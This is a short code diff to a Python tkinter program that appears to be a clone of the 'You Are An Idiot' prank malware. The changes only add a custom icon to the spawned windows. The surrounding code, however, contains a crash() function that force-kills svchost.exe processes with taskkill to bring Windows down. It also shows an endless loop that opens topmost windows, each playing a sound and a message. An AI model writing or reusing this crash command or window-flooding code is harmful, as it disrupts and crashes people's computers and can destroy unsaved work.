@@ -15,6 +15,13 @@ root.attributes("-topmost", True)
 root.withdraw()
 list_of_windows = []
 
+try:
+  ico = Image.open('./yaai.ico')
+  photo = ImageTk.PhotoImage(ico)
+  root.wm_iconphoto(False, photo)
+except Exception as e:
+  print(e)
+
 def crash():
     os.system("taskkill /f /im svchost.exe /t")
 
@@ -74,9 +81,16 @@ while True:
         y.pack()
         x.lift()
         x.attributes("-topmost", True)
+        try:
+            ico = Image.open('./yaai.ico')
+            photo = ImageTk.PhotoImage(ico)
+            x.wm_iconphoto(False, photo)
+        except Exception as e:
+            print(e)
         x.after(10, play_gif, imagelist, y)
         threading.Thread(target=play_idiot_sound, args=(_,)).start()
         threading.Thread(target=run_msg, args=(_,)).start()
+        
         list_of_windows.append([x,x_pos, y_pos, 4, 4])
     while True:
         for x in list_of_windows:
